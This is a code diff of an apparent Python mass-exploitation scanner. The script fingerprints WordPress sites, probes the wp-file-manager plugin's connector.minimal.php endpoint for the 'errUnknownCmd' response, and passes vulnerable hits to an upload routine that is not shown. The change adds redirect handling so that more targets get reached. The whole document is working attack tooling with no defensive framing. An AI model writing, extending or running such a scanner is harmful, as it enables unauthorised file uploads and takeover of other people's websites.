@@ -32,30 +32,31 @@ def upload(urls, urls_):
 def checkwp(urls):
 
     try:
-        _ = ['s.w.org', 'wp-content', 'wp-login.php', 'wp-includes']
-        r = requests.get(f'{urls}', headers=headers, timeout=10 ,verify=False)
-        if any(identifier in r.text for identifier in _):
-            r1 = requests.get(f'{urls}wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php', headers=headers, timeout=10, verify=False)
-            if r1.ok:
-                if 'errUnknownCmd' in r1.text:
-                    upload(r1.url, urls)
+        keys = ['s.w.org', 'wp-content', 'wp-login.php', 'wp-includes']
+        r = requests.get(f'{urls}', headers=headers, timeout=10 ,verify=False, allow_redirects=False)
+        if r.status_code == 200:
+            if any(key in r.text for key in keys):
+                r1 = requests.get(f'{urls}wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php', headers=headers, timeout=10, verify=False, allow_redirects=False)
+                if r1.ok:
+                    if 'errUnknownCmd' in r1.text:
+                        upload(r1.url, urls)
+                    else:
+                        pass
                 else:
                     pass
             else:
                 pass
-        else:
-            pass
     except:
         pass
 
 
 def main(urls):
     try:
-        r = requests.get('http://{}/'.format(urls), headers=headers, timeout=10, verify=False)
-        if r.ok:
+        r = requests.get(f'http://{urls}/', headers=headers, timeout=10, verify=False, allow_redirects=False)
+        if r.status_code == 200:
             checkwp(r.url)
-        else:
-            pass
+        if r.status_code == 301:
+            checkwp(r.headers['Location'])
     except:
         pass
 
